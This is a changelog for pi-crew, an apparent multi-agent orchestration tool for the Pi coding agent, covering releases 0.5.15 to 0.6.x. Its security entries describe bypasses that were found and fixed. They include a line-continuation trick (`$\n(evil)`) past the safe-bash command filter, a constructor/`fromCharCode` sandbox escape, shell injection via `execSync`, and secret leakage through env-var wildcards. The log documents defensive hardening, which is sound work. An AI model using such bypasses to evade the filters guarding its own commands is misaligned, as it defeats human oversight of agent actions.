- **Cross-platform CI green** — 0 failures across Ubuntu, macOS, and Windows (4,725 unit + 113 integration tests)
- **87 pre-existing test failures resolved** — 0 failures across 4,792 tests in 506 test files
- **Heartbeat false-positive dead detection fixed** — `message_start` added to progress flush events; PID liveness gate uses `task.checkpoint.childPid` fallback
- **ENOENT crash on prune/forget race fixed** — 4-layer defense in `persistSingleTaskUpdate`, `persistHeartbeat`, `saveRunTasks`, and `upsertCrewAgent`
- **Scheduled job lifecycle completed** — spawned runs tracked via `spawnedRunIds[]`, auto-cancelled on job removal, manifests stamped with `schedulerJobId` for traceability
- **Worktree precondition validation** — friendly error messages instead of crashes when cwd is not a git repo or repo has uncommitted changes
- **Cross-platform path handling** — `canonicalizePath` with `realpathSync.native` for Windows short-name/long-name aliasing; macOS `/var` → `/private/var` symlink resolution
- **Pipe buffer deadlock fix** — `spawnSync` with `stdio: 'pipe'` caused deadlock when OS pipe buffer (~64KB) filled at ~227 tests; switched to `stdio: 'inherit'`
- **Stale lock recovery** — removed `readLockToken` guard so stale locks without 'token' field are properly deleted
- **Full-feature smoke test** — 58 integration tests covering all pi-crew actions
- **Pre-push review**: 56 unpushed commits reviewed (116 files, +9,599/−980 lines), 1 release blocker found and fixed

### Bug Fixes
- **`89ed975`** — Heartbeat watcher: added `message_start` to `shouldFlushProgressEvent()` so LLM stream start updates `lastActivityAt`. Previously, an 8m53s LLM response (365 file reads, no tool calls) triggered false `heartbeat_dead` at 300s threshold.
- **`9c1bf1f`** — Heartbeat watcher: PID liveness gate uses `task.heartbeat?.pid ?? task.checkpoint?.childPid` fallback. Review team discovered the gate was dead code because `createWorkerHeartbeat(taskId)` never receives PID.
- **`2bbbb99`** — ENOENT crash: `persistSingleTaskUpdate` recheck stat wrapped in try/catch; `persistHeartbeat` catches ENOENT; `saveRunTasks` guards with `statSync(stateRoot)`; `upsertCrewAgent` skips if stateRoot gone.
- **`08df7ce`** — Release blocker: `src/errors.ts` enum→const object, `src/state/health-store.ts` parameter property — both incompatible with Node 22 `--experimental-strip-types`.
- **`3e0b957`** — Sandbox constructor escape detection strengthened.
- **`dd279bc`** — EBADF (missing O_WRONLY flag), re-entrant sync locks, worktree list parsing, env-filter provider keys.
- **`38b8f5a`** — Create `transcripts/` directory before child-pi appends.
- **`d893434`** — Child-pi: remove API key allowlist; child Pi uses same config as parent.
- **`5cb9122`** — Cross-platform: `canonicalizePath` in `paths.ts` uses `realpathSync.native` for consistent long-name paths on Windows; all test temp dirs canonicalized through `.native`.
- **`3b46556`** — Cross-platform: `resolvedWorktreeRoot` uses `.native` for git worktree compatibility on Windows; worktree list comparison normalizes through `.native`.
- **`b2b7068`** — Worktree: precondition validation in `team-tool/run.ts` checks git repo existence and clean leader status before creating run manifest, returning friendly error messages instead of crashing.
- **`8090fe2`** — Worktree: respect `requireCleanWorktreeLeader` config setting in precondition check.
- **`2014739`** — Pipe buffer deadlock: `spawnSync` with `stdio: 'pipe'` caused deadlock when OS pipe buffer (~64KB) filled at ~227 tests; switched to `stdio: 'inherit'`.
- **`d6920bf`** — Stale lock recovery: removed `readLockToken` guard so stale locks without 'token' field are properly deleted.
- **`3897c1d`** — Mailbox: return paths as-is from `safeMailboxDir`, `safeMailboxFile`, `safeMailboxTasksRoot`, `taskMailboxDir` instead of re-resolving through `resolveRealContainedPath` which changed path forms on Windows.
- **`f867d4d`** — macOS: `realpathSync(os.tmpdir())` in 3 test files to handle `/var` → `/private/var` symlink.
- **`2fd0c1e`** — TypeScript: fix Property 'text' and Property 'taskId'→'id' errors for strict compiler checks.

### Test Fixes (87 total)
- **`1ab7926`** — 33 failures: state-store mtime CAS, locks race, discovery, atomic-write, config-schema, blob-store, env-filter, sandbox, security-hardening, worktree
- **`bba0bed`** — 3 failures: blob dedup, auto-recovery cap, transcript append
- **`03dd9b3`** — 14 failures: team-runner, retry-runner, hooks, stale-reconciler, resume-checkpoint, dynamic-script-runner, adaptive-implementation
- **`a91c316`** — 5 failures: re-entrant sync locks (`withRunLockSync`), `registerWorker()` optional `registeredAt`, `phase8-smoke` PI_TEAMS_HOME isolation, `test-integration-check` PI_CREW_ALLOW_MOCK, `test-bugs-all.mjs` graceful skip
- **`952c14d`** — 58 full-feature smoke tests added

### Features
- **`14269f0`** — Scheduler tracks spawned runs: `ScheduledJob.spawnedRunIds[]`, `CrewScheduler.recordSpawnedRun()`, `remove()` calls `runCancelFn` per spawned run, manifests stamped with `schedulerJobId`/`schedulerName`.
- **`e499570`** — Plugin registry system for framework context injection (Next.js, Vite, Vitest).
- **`84170c3`** — Team runner integrates plugin registry for framework-aware task context.
- **`ee466a8`** — Health score system with penalty-based scoring and time-series snapshots.
- **`daa53ab`** — Atomic write v2 with fsync + rename pattern for crash-safe state persistence.
- **`6c01f2c`** — CrewError taxonomy: E001–E006 structured error codes.
- **`2ce143f`** — State-store uses CrewError for structured errors.
- **`0cd4853`** — Stable task IDs via `stableIdFromContent` for cross-run consistency.
- **`ff3da92`** — Health snapshot saved on run completion.

### Stats
- 137 commits since v0.6.1
- 200 files changed (+16,955 / −2,057 lines)
- 366 source files, ~70K lines TypeScript
- 506 test files, ~66K lines TypeScript
- 4,792 tests, 0 failures
- CI: Ubuntu ✅ macOS ✅ Windows ✅ (0 failures each)


## [0.6.3] — Post-Release Hardening: Cleanup, Safe-Paths, State-Store Race (2026-06-08)

### Highlights
- **State-store manifest/tasks mtime race fixed** (commits `04fe0be`, `f15ee98`) — `loadRunManifestById` no longer throws on benign mtime skew between `manifest.json` and `tasks.json`. A previous user review (run `team_20260608082852_*`) hit a 4812-second hang because of this throw; the fix prevents the same hang from recurring.
- **Orphan worker + temp dir cleanup hardened** (8 commits) — 4-layer defense (in-memory Set, per-session temp dir, user-root temp dir, legacy `/tmp` cleanup) with symlink guards, `O_NOFOLLOW` opens, and bounded batch sizes.
- **`PI_CREW_PARENT_PID` restored to child env allow-list** (commit `e1f7dfe`) — silent regression from a previous round fixed; parent-guard now works again for orphan-worker detection.
- **`safe-paths.resolveRealContainedPath` extended** (commits `ba0ce54`, `aa457a5`) — now supports creating new files (target does not have to exist) while keeping full symlink-ancestor protection.
- **`blob-store` metadata race fixed** (commit `5819b18`) — per-hash in-memory lock + atomic write of content-then-metadata prevents concurrent writers from corrupting metadata.
- **Behavior change: `parent-guard` no longer `.unref()`s its interval** — the guard timer now keeps the event loop alive by design so workers do not exit while their parent is still alive but the worker has no other pending work. See "Behavior Changes" below.

### Security Fixes
- **`e1f7dfe`** — Restored `PI_CREW_PARENT_PID` in `child-pi.ts` env allow-list. Previous round (`dbf7a48`) replaced `PI_CREW_*`/`PI_TEAMS_*` wildcards with an explicit list but omitted `PI_CREW_PARENT_PID`, silently breaking the parent-guard mechanism.
- **`ba0ce54` / `aa457a5`** — `safe-paths.resolveRealContainedPath` now allows new-file creation while keeping symlink-ancestor protection. Documented the asymmetric ancestor policy in the function JSDoc.
- **`e1f7dfe`** (sibling) — `worktree/cleanup.ts` no longer uses `PI_*` / `PI_CREW_*` wildcards in `GIT_SAFE_ENV` (could match secret vars like `PI_PASSWORD`).
- **`2b8f27a` / `1bf67eb`** — Child env allow-list switched from dangerous wildcards (`*_API_KEY`, `*_TOKEN`, `*_SECRET`, `LC_*`, `XDG_*`, `NPM_*`) to an explicit list of 6 API keys + 12 essential env vars. Eliminates accidental secret leakage via matching name patterns.

### Cleanup Hardening (8 commits)
- **`5edcb18`** — Track temp dirs globally via in-memory `Set<string>`, cap `reconcileOrphanedTempWorkspaces` scan size, fix cleanup stub.
- **`8ba270d`** — Move temp dirs from `/tmp` to `~/.pi/agent/pi-crew/tmp/` (uses `userPiRoot()` so `PI_TEAMS_HOME` / `PI_CODING_AGENT_DIR` are respected). Eliminates `/tmp` pollution and unifies state layout.
- **`ceb1cb1`** — Layer 4 periodic cleanup for orphan prompt/task temp dirs older than 24h.
- **`a76932d`** — Skip symlinks and in-use dirs during cleanup, plus a one-shot legacy `/tmp` sweep to clean up directories left behind by pre-`8ba270d` installations.
- **`c9eb430`** — Kill orphan background workers and trigger temp cleanup on `session_start`.
- **`a192509`** — 4 critical hardening fixes: never `rmSync` a symlink, double-check immediately before delete, skip dirs currently in use, and tear down the global tracker on process exit.
- **`992231d`** — 24 new unit tests in `test/unit/cleanup-orphan-temp.test.ts` covering each cleanup layer and failure mode.
- **`dbf7a48`** — UI: replace `console.log` cleanup messages with `notifyOperator` for proper user notification.

### Bug Fixes
- **`5819b18`** — `blob-store.writeBlob` race condition: per-hash lock + atomic write of content-then-metadata (previously metadata first, leaving orphans on blob write failure).
- **`04fe0be`** — `state-store.loadRunManifestById` returned `undefined` (was: threw) on manifest/tasks mtime mismatch — the throw caused background runners to crash within 1s of startup.
- **`f15ee98`** — `state-store.loadRunManifestById` removed the false-positive mtime check entirely. The `saveManifestAndTasksAtomicSync` writer intentionally writes manifest before tasks, so a manifest with newer mtime than tasks is a NORMAL post-write state, not corruption.
- **`cd7ef89` / `a0c2ba3` / `098c8a9` / `b782424` / `e1ea7d4` / `de3f550` / `2b8f27a` / `1bf67eb`** — 8 deep-review auto-fix commits addressing 78+77+29+28+24+24+24+24 verified issues across the cleanup, state, runtime, and utils modules.
- **`e1f7dfe`** — `parent-guard.ts` unref'd timers were silently causing worker exit while parent was still alive; restoring the allow-list entry brought the guard back into effect.

### Behavior Changes
- **`parent-guard.ts` no longer `.unref()`s the guard interval** (revert/restore series `0aed8b5` / `152ac80` / `ee0ddb4` / `81b9608`). The watchdog timer now keeps the event loop alive by design. If a worker has no other pending work (no I/O, no timers, no child processes), the guard interval is the only thing keeping the worker alive until either the parent dies or the worker is explicitly stopped. The previous revert-then-restore pattern ("to test if they cause pi hang") never conclusively identified a root cause; the current state was reached after manual testing. **Mitigation recommended**: add a max-worker-lifetime safety net in a future release.

### New / Heavily Expanded Source Files
- **`src/runtime/orphan-worker-registry.ts`** (NEW, 307 lines) — PID+start-time+parent-PID verification before SIGKILL; file-locked registry at `<userPiRoot>/state/orphan-workers.json`; honest about residual userspace TOCTOU window between start-time re-check and actual `process.kill`.
- **`src/runtime/pi-args.ts`** (heavily expanded, 342 lines) — `createSafeTempDir` walks the full ancestor chain rejecting symlinks; `buildPiWorkerArgs` builds the child argv safely (no shell); `cleanupTempDir` / `cleanupAllTrackedTempDirs` / `cleanupOrphanTempDirs` / `cleanupLegacyOrphanTempDirs` provide 4 layers of defense with bounded work.

### Test Coverage
- **`test/unit/orphan-worker-registry.test.ts`** (NEW, 279 lines) — `registerWorker` / `unregisterWorker` / `cleanupOrphanWorkers` with `__test_setRegistryPath` for isolation; covers invalid PIDs, dedup, parent-PID tolerance, current-session protection, dead-PID pruning.
- **`test/unit/cleanup-orphan-temp.test.ts`** (NEW, 242 lines) — covers `cleanupTempDir` / `cleanupAllTrackedTempDirs` / `cleanupOrphanTempDirs` / `cleanupLegacyOrphanTempDirs` with `utimesSync` to simulate aged dirs; tests symlink skip, in-use skip, and `/tmp` legacy cleanup.
- **`test/integration/cleanup-full-flow.test.ts`** (NEW, 241 lines) — end-to-end integration of all cleanup layers, simulating a crashed session.

### Documentation
- **`src/runtime/parent-guard.ts`** — added a "Trust model" JSDoc section explaining why `PI_CREW_PARENT_PID` is safe to pass in env (PID is not a secret), what residual risks remain (child can spoof before guard starts), and why the guard is a self-termination signal, not a security boundary.
- **`src/utils/safe-paths.ts:resolveRealContainedPath`** — added a "Security model — asymmetric ancestor handling" JSDoc section explaining why `baseDir` ancestors must exist (cannot validate otherwise) while target ancestors may be non-existent (for new-file creation).

### Stats
- 23 commits since v0.6.2: `0aed8b5`, `152ac80`, `ee0ddb4`, `81b9608`, `5edcb18`, `8ba270d`, `ceb1cb1`, `a76932d`, `c9eb430`, `a192509`, `992231d`, `dbf7a48`, `e1f7dfe`, `1bf67eb`, `2b8f27a`, `de3f550`, `e1ea7d4`, `5819b18`, `cd7ef89`, `b782424`, `a0c2ba3`, `098c8a9`, `ba0ce54`, `aa457a5`, `04fe0be`, `f15ee98`
- 79 files changed (+3567 / -712)
- 1 new state fix: manifest/tasks mtime false positive
- 1 new file: `orphan-worker-registry.ts` (307 lines)
- 3 new test files: 762 lines

## [0.6.2] — Issue #28 + #29 Fixes + Post-Review Hardening (2026-06-05)

### Highlights
- **Issue #28 fixed**: `crew-init.ts` jiti namespace race — inline `parseRoot`/`safeJoin`/`safeDirname`/`safeResolve` helpers; jiti upgraded 2.6.1 → 2.7.0
- **Issue #29 fixed**: 11 hardcoded `.crew/state/runs/...` sites now use `projectCrewRoot()` for `.pi/teams/` fallback
- **Subagent defense-in-depth**: `record.promise` rejection can no longer crash pi via `unhandledRejection`
- **2 new MEDIUM-severity path-traversal vulnerabilities fixed** in `decision-ledger.ts` (7 functions) and `run-graph.ts` (3 functions)
- **F-8 safeJoin edge case** fixed (trailing separator handling)
- **~100 new tests** across 7 files (5 e2e scripts + 18 regression tests for the new fixes)

### Security Fixes (MEDIUM)
- `decision-ledger.ts`: `initLedger`, `appendEntry`, `getLedger`, `getLatestDecision`, `summarizeLedger`, `promoteCandidate`, `decayCandidate` now call `assertSafePathId("runId", runId)` to prevent path-traversal
- `run-graph.ts`: `saveRunGraph`, `loadRunGraph`, `listRunGraphs` use `projectCrewRoot()` and `assertSafePathId("runId", runId)` (same bug class as issue #29)

### Bug Fixes
- **F-1** (post-issue-#29 review): removed duplicate "Defense in depth" comment in `subagent-manager.ts`
- **F-3** (post-issue-#29 review): added F-6 documentation in `test/unit/crew-init.test.ts` header
- **F-8** (post-issue-#29 review): `safeJoin("/", "foo")` no longer produces `"//foo"`; trailing separator in parts is stripped (UNC paths preserved)
- **`crew-init.ts safeJoin`**: collapse internal runs of separator while preserving leading UNC `\\\\` and POSIX `/`

### Test Coverage
- 9 new regression tests in `test/unit/issue-29-pi-paths.test.ts` (resolver precedence, `waitForRun` error message in both layouts, checkpoint/skill-effectiveness round-trip in `.pi/`-only project, decision-ledger path, defense-in-depth via real child process)
- 13 new tests in `test/unit/crew-init.test.ts` (F-1 UNC preservation, F-2 jiti race via `path` Proxy, F-3 `safeResolve` graceful degradation, F-4 `__test__internals` export convention, F-5 stale docstring, F-6 async-runner rationale, F-8 trailing-separator)
- 4 new tests in `test/unit/crew-init.test.ts` for `safeJoin` (F-8 regression coverage)
- 7 new tests in `test/unit/decision-ledger.test.ts` (path-traversal rejection)
- 3 new tests in `test/unit/run-graph.test.ts` (path-traversal rejection)
- 14 new tests in `test/unit/skill-effectiveness.test.ts` (cwd parameter migration)
- 5 new E2E scripts in `scripts/test-issue-29-*.ts`:
  - `test-issue-29-e2e.ts` — unit-level integration
  - `test-issue-29-crash.ts` — focused crash reproduction
  - `test-issue-29-team-tool.ts` — slow-path early-exit error message
  - `test-issue-29-real-tasks.ts` — full `executeTeamRun` pipeline in `.pi/`-only project (25 assertions)
  - **`test-issue-29-real-runtime.ts`** — spawns REAL detached `background-runner.ts` process (most realistic)

### Test Quality Improvements
- **F-4** (post-issue-#29 review): `crew-init.ts findProjectRoot` now accepts optional `path` dep; test passes the `stubPath` Proxy directly to source code (not a copy)
- **F-5** (post-issue-#29 review): defense-in-depth crash test now spawns a real child process so the host's `unhandledRejection` detector can actually fire (was previously a comment-only test)

### Stats
- 7 source files changed (3 fixes + 1 new path-resolver usage)
- 7 test files changed (4 unit + 5 e2e scripts)
- 9 commits since v0.6.1: `e95e055`, `cd8c3b8`, `a80fe6c`, `362789c`, `0c78307`, `083afaf`, `d33b86c`, `03c0a20`, `1bedd24`, `0ce3d5a`, `b17fb6b`, `f8731e6`, `105d31d`, `00c66a5`, `2d49910`, `6cbbafa`

## [0.6.1] — Post-v0.6.0 Security Hardening + Test Coverage (2026-06-04)

### Highlights
- **42+ security issues fixed** — 7 CRITICAL, 10 HIGH, 11 MEDIUM, 14 post-restart review findings
- **~1,900 new tests** across 113+ test files — total suite now ~4,600 tests
- **38 dead exports cleaned** across 19 modules
- **12 `any` types replaced** with proper TypeScript types
- **Full battle-testing** — 2 Pi restart cycles, all team types, management operations verified

### Security Fixes (CRITICAL)
- `async-runner.ts`: Environment variable leak in child process — sanitized with `sanitizeEnvSecrets()`
- `verification-gates.ts`: Shell injection via user-controlled strings — switched to `execFileSync`
- `sandbox.ts`: `String.fromCharCode` bypass — added `constructor` to `FORBIDDEN_PATTERNS`
- `locks.ts`: Timing-unsafe comparison on lock tokens — replaced with constant-time compare
- `event-log.ts`: Request IDs logged in plaintext — now hashed before logging
- `team-runner.ts`: Missing heartbeat for long-running tasks — added 30s heartbeat writer
- `worktree-manager.ts`: Environment secrets leaked to git subprocesses — `sanitizeEnvSecrets()`

### Security Fixes (HIGH)
- `preStepScript` symlink traversal — `fs.realpathSync` before path containment check
- `childEnvAllowList` wildcard patterns (`LC_*`, `XDG_*`) could leak secrets
- Event log sync/async race condition — route sync `appendEvent` through async queue
- Subagent record validation — `sanitizePersistedRecord()` with allow-listed fields
- Verification gate redirect — allow single `>` for `2>&1`, block `>>` and `<[^&]`
- `allowPatterns` validation — reject patterns matching empty strings

### Security Fixes (MEDIUM)
- `logInternalError` import paths normalized across all modules
- `Object.freeze()` narrowing fix — use `Readonly<{...}>` explicit types
- NTFS mtime granularity — write-first, `utimes`-after for cache invalidation
- Windows path separators — platform-agnostic assertions in tests
- `executeUnchecked` visibility — `__test_executeUnchecked` export pattern
- `seedPaths` containment — `normalizeSeedPaths()` validates paths stay within `repoRoot`

### Code Quality
- 38 dead/unused exports removed across 19 source modules
- 12 `any` types replaced with proper interfaces
- `enforceLabelCap` MRU correctness — `delete`-then-`set` to maintain Map insertion order
- `readIfSmall` bounded reads — `Buffer.alloc` + `fs.readSync` instead of `readFileSync`

### Test Coverage
- 113 new test files, ~1,900 new test cases
- Modules now covered: config, extension, workflow, subagent, observability, runtime, graph,
  heartbeat, permissions, state, locks, event-log, safe-bash, sandbox, verification-gates,
  async-runner, team-runner, background-runner, worktree, fingerprint, BM25 search, and more
- Windows CI verified: path separators, `npx.cmd` resolution, NTFS mtime all pass
- Test runner wrapper (`scripts/test-runner.mjs`) ensures non-zero exit on failures

### Stats
- Test suite: ~4,600 pass, 0 fail
- TypeScript: 0 errors
- Lines added since v0.6.0: 22,520 (742 src + 21,777 test)
- Files changed: 204
- Security issues fixed: 42+
- Audit rounds: 42 (including post-v0.6.0 battle-testing)

## [0.6.0] — Source Tour Patterns + 15 New Modules (2026-06-03)

### Highlights
- **15 upstream patterns implemented** from 63-repository source tour
- **10 new source modules** (2,267 LOC): chain-parser, run-drift, intercom-bridge,
  plan-templates, task-id, context-retrieval, intermediate-store, fingerprint,
  memory-store, observation-store
- **37 skills reviewed** with origin fields, all passing validation

## [0.5.22] — Remaining Issues from Ultimate Sweep (2026-06-03)

### Highlights
- `DEFAULT_CHILD_PI` frozen with `Readonly<>` type (prevents mutation)
- `parseWithSchema` logs validation failures with context
- Global registry cleanup (`uninstallCrewGlobalRegistry`)
- Mailbox sender auth and cross-workspace hooks documented

### Fixes
- `defaults.ts`: `DEFAULT_CHILD_PI` wrapped in `Readonly<{...}>` to prevent mutation via module injection
- `config.ts`: `parseWithSchema` logs validation failures when context provided
- `team-tool.ts`: Added `uninstallCrewGlobalRegistry()` paired with install
- `register.ts`: Calls `uninstallCrewGlobalRegistry()` in `cleanupRuntime()`
- `mailbox.ts`: Security documentation for sender authentication
- `hooks/registry.ts`: Security documentation for cross-workspace hook behavior

### Stats
- Test suite: 2703 pass + 1 skip, 0 fail
- TypeScript: 0 errors

## [0.5.21] — Ultimate Final Sweep: HIGH Security + Correctness Fixes (2026-06-03)

### Highlights
- **safe-bash line-continuation bypass fixed** — `$\n(evil)` now blocked
- **scheduledJobs dead code fixed** — settings sanitizer now passes through scheduled jobs
- **Memory-bounded file reads** — `readIfSmall` uses `fs.readSync` with buffer instead of full file read
- **Event log corruption detection** — `scanSequence` logs warnings for corrupt JSON lines

### Security
- `safe-bash.ts`: All structural checks now use `normalized` string (stripped line continuations)
- `\$\s*\(` regex catches `$<newline>(evil)` → `$(evil)` bypass that bash interprets as command substitution
- Added 2 regression tests for line-continuation bypass

### Fixes
- `settings-store.ts`: `sanitizeSettings()` now copies `scheduledJobs` as opaque array
- `task-output-context.ts`: `readIfSmall` uses `Buffer.alloc` + `fs.readSync` instead of `readFileSync` + `slice`
- `event-log.ts`: `scanSequence` counts and logs corrupt JSON lines via `logInternalError`

### Stats
- Test suite: 2703 pass + 1 skip, 0 fail
- TypeScript: 0 errors
- Total issues fixed across 37 rounds: ~155+

## [0.5.20] — Verification Sweep: 7 Fixes (2026-06-03)

### Highlights
- **Correctness bug fixed**: `enforceLabelCap` could silently evict actively-used metric entries
- `Date` removed from forbidden globals (was blocking legitimate workflow scripts)
- `scheduledJobs` properly typed in `CrewSettings` interface
- 3 new tests for metric MRU eviction behavior

### Fixes

#### Correctness
- `Counter.inc()` and `Gauge.set()` now delete-then-set to move keys to MRU position
- Previously, `enforceLabelCap` could evict an entry that was just updated

#### Consistency
- Removed `Date` from `FORBIDDEN_GLOBALS` in `DynamicScriptRunner`
- `Date` is not dangerous — was causing false positives for `myDate`, `updateDate`, etc.
- `DynamicScriptRunner` and `WorkflowSandbox` now consistent

#### Type Safety
- Added `scheduledJobs?: unknown[]` to `CrewSettings` interface
- Removed `as any` cast in `register.ts` (now uses `as ScheduledJob`)

#### Code Quality
- Removed dead `reason` variable in `settings-store.ts`
- Added trailing newline to `event-bus.ts` (POSIX compliance)
- Added 3 tests for Counter/Gauge MRU eviction behavior

### Stats
- Test suite: 2658+ pass + 1 skip, 0 fail
- TypeScript: 0 errors
- Security: All 7 SEC-* issues confirmed still fixed

## [0.5.19] — Final Sweep: 8 MEDIUM/LOW Fixes + 2 Test Fixes (2026-06-03)

### Highlights
- **All remaining issues fixed** — 4-agent review sweep found 0 CRITICAL/HIGH
- 2 pre-existing test failures fixed (env isolation)
- Memory bounds added to security log and metrics primitives
- Defensive path validation in streaming/sidechain output
- Production cleanup now clears hooks

### Fixes

#### MEDIUM: Memory bounds
- `securityEventLog` in `discover-agents.ts` capped at 1,000 entries (was unbounded)
- `Counter`/`Gauge`/`Histogram` Maps in `metrics-primitives.ts` capped at 10,000 label combinations

#### LOW: Code quality
- `console.warn` → `logInternalError` in `settings-store.ts` and `discover-agents.ts`
- `crewEventBus` dead code documented (retained for future use)
- `clearHooks()` called in production cleanup path (`register.ts`)
- `assertSafePathId` added to `streaming-output.ts` and `sidechain-output.ts`

#### Test fixes
- `adaptive-implementation.test.ts`: replaced `restoreEnv` with `delete` to prevent leaked `PI_CREW_ROLE`
- `subagent-tools-integration.test.ts`: added env isolation to first test case

### Stats
- Test suite: 2688 pass + 1 skip, 0 fail
- TypeScript: 0 errors
- Files changed: 9

## [0.5.18] — Final Review Fixes (2026-06-03)

### Highlights
- **4 HIGH issues fixed** from comprehensive final review of entire codebase
- CI now properly fails when tests fail (`npm test` exits non-zero)
- Sandbox prototype freeze scoped to VM context (no host process impact)
- Safe-bash extension delegates to core module (eliminated ReDoS regression)
- Shell injection eliminated in project-detector (`execSync` → `execFileSync`)

### Fixes

#### HIGH: CI exit code
- `tsx --test` always exits 0 even with failing tests — masked regressions in CI
- Added `scripts/test-runner.mjs` wrapper that parses test output and exits 1 on failures
- Updated `test:unit` and `test:integration` npm scripts

#### HIGH: Sandbox prototype freeze scope
- `Object.freeze(Object.prototype)` in `WorkflowSandbox` constructor affected entire Node.js process
- Moved freeze inside VM context via `vm.runInContext()` — only freezes when sandbox is created, skipped in `NODE_ENV=test`
- Context object itself frozen (process-safe, only freezes our record)

#### HIGH: Shell injection risk in project-detector
- `execSync("git remote get-url origin")` passed through `/bin/sh -c` — any interpolated variable would be vulnerable
- Replaced with `execFileSync("git", ["remote", "get-url", "origin"])` — no shell interpretation

#### HIGH: ReDoS regression in safe-bash-extension
- Extension duplicated outdated regex patterns with O(n²) backtracking
- Refactored to import `isDangerous()` from `safe-bash.ts` (linear-time scanner)
- Eliminated code divergence between core and extension modules

### Stats
- Test suite: 2698 pass + 1 skip, 0 fail
- TypeScript: 0 errors
- Files changed: 5
- Security issues fixed: 4 HIGH

## [0.5.17] — Security Hardening + ECC Patterns + Skill Review (2026-06-03)

### Highlights
- **3 CRITICAL security fixes**: path traversal, sandbox escape, executeUnchecked bypass
- **3 HIGH security fixes**: allowPatterns bypass, safe-bash fallback message, mock mode
- **3 MEDIUM security fixes**: home hooks visibility, API keys documentation, sync lock deprecation
- **2 new features** from ECC/dmux patterns: seedPaths overlay + structured handoff template
- **2 gap fills**: handoff parser + per-step seedPaths
- **36 skills reviewed**: origin fields, broken refs fixed, verify-skill.ts updated
- **1 bug fix**: adaptive-plan parser strips markdown code fences
- **1 regression fix**: mock mode NODE_ENV gate reverted
- **41 new tests** across 6 test files

### Security Fixes

#### CRITICAL
1. `orchestrate.ts`: Path traversal — planPath validated with `resolveContainedPath()`
2. `sandbox.ts`: Prototype pollution — `Object.freeze` on prototypes, `globalThis`/`global` in FORBIDDEN_PATTERNS
3. `dynamic-script-runner.ts`: `executeUnchecked` → private, `__test_executeUnchecked` test-only export

#### HIGH
4. `safe-bash.ts`: allowPatterns validation rejects `/.*/` and permissive catch-all patterns
5. `safe-bash-extension.ts`: Error message no longer suggests bypassing safe-bash
6. `child-pi.ts`: Mock mode requires `PI_CREW_ALLOW_MOCK=1` (set in parent process only)

#### MEDIUM
7. `worktree-manager.ts`: `logInternalError` warning when home directory hooks accepted
8. `child-pi.ts`: SECURITY WARNING JSDoc on API key allow-list trade-off
9. `event-log.ts`: Expanded deprecation notice on `withEventLogLockSync` blocking behavior

### Features (ECC/dmux patterns)

- **seedPaths**: Overlay local/uncommitted files into worktrees via config (`worktree.seedPaths`) or per-step (`WorkflowStep.seedPaths`). Path traversal validation, dedup, recursive copy.
- **Structured Handoff Template**: `HANDOFF_TEMPLATE` constant + `parseHandoffFromOutput()` parser. Agents receive handoff format instructions automatically.

### Skill Review
- All 36 skills: added `origin` YAML frontmatter field
- Fixed `widget-rendering` wrong file path
- Fixed `orchestration` + `detection-pipeline-design` broken cross-skill references
- Fixed 4 skills with wrong `source/pi-mono/` paths
- `verify-skill.ts` now validates `origin` field

### Bug Fixes
- `adaptive-plan.ts`: `stripCodeFence()` strips markdown code fences inside ADAPTIVE_PLAN markers — fixes planner output parsing for non-frontier models
- Mock mode regression: reverted NODE_ENV gate, uses PI_CREW_ALLOW_MOCK only (child processes don't inherit NODE_ENV)

### Stats
- Test suite: 2698 pass + 1 skip, 0 fail (was 2657 in v0.5.16; +41 net)
- TypeScript: 0 errors
- New test files: 6 (worktree-seed-paths, task-handoff-template, task-handoff-parser, adaptive-plan +3 safe-bash tests)
- Files touched: 50+
- Security issues fixed: 9 (3 CRITICAL + 3 HIGH + 3 MEDIUM)
- False positives verified: 2

## [0.5.16] — Rounds 22–31 Audit Fixes (2026-06-02)

### Highlights
- **1 bug fix**: OTLP exporter `dispose()` now awaits in-flight push (bounded by 10s timeout)
- **269 new unit tests** across 16 previously-untested modules (Pattern #3)
- **72 unused imports removed** across 28 source files (Pattern #6)
- **2 defensive caps** for unbounded Maps (Pattern #2)
- **1 L1 fix**: `console.warn` → `logInternalError` in crew-hooks

### Round 22: Defensive Caps (commit 85b3be6)
- Bounded `autoRecoveryLast` and `agentEventSeqCache` Maps to 1000 entries
- Eviction uses insertion-order oldest-first pattern

### Round 23: Resource Cleanup (commit 4be2c4e)
- OTLP exporter `dispose()` now async, awaits in-flight push with 10s timeout
- Surveyed all setInterval/setTimeout, process.on, file watchers, event listeners, AbortControllers — all clean

### Round 24: Test Coverage — discover-agents, markers, tiered-eval (commit cfe5242)
- 50 new tests: `sanitizeAgentSystemPrompt` (6 rules), `sanitizeGuidanceContent` (5 rules), `TieredEvalRunner` class

### Round 25: Test Coverage — adaptive-plan, group-join (commit 89e1cf1)
- 42 new tests: `slug`, `extractAdaptivePlanJson`, `parseAdaptivePlan`, `repairAdaptivePlan`, `GroupJoinManager`

### Round 26: Test Coverage — pi-args, i18n (commit 3669f24)
- 38 new tests: `applyThinkingSuffix`, `resolveCrewMaxDepth`, `t()`, `addTranslations`, `listLocales`

### Round 27: Test Coverage — validation-types, live-extension-bridge (commit 44a2366)
- 36 new tests: `validateWithSeverity` strict/lenient modes, `buildExtensionBridge` mock session

### Round 28: Test Coverage — direct-run, live-session-health (commit 339ac7d)
- 17 new tests: `isDirectRun`, `directTeamAndWorkflowFromRun`, `collectLiveSessionHealth`

### Round 29: Test Coverage — process-status, task-claims (commit 405e05d)
- 43 new tests: `checkProcessLiveness`, `isActiveRunStatus`, full claim lifecycle

### Round 30: Test Coverage — task-display, green-contract, session-utils (commit 7d065ca)
- 43 new tests: `shouldMaterializeAgent`, `taskById`, `waitingReason`, `greenLevelSatisfies`, `assertValidSessionId`

### Round 31: Code Quality — unused imports + L1 fix (commit 35cc0e7)
- 72 unused imports removed across 28 source files
- `crew-hooks.ts`: `console.warn` → `logInternalError` for unknown event types

### Stats
- Test suite: 2657 pass + 1 skip, 0 fail (was 2370 in v0.5.14; +287 net)
- TypeScript: 0 errors
- New test files: 13
- Files touched: 58

## [0.5.15] — Round 20 + 21 Audit Fixes (2026-06-02)

### Source tour
- Pulled latest `can1357/oh-my-pi` (1751 new commits since 2026-05-11) to working copy
- Surveyed extensibility, skill system, and security/performance changes via 3 parallel explorer agents
- Distilled 2 high-impact, immediately applicable patterns (Round 20)
- Identified 5 more upgrade opportunities; applied 5 in Round 21

### Round 20: Lock token guard + tool-error sanitization (commit f448d7d)

#### 1. Per-process lock tokens (src/state/locks.ts)
- **Pattern source**: oh-my-pi commit `cd578a86d` (`file-lock.ts:13-152`)
- **Bug fixed**: "Losing contender wipes winner's lock" race when one process times out and steals a stale lock that the original holder is about to release
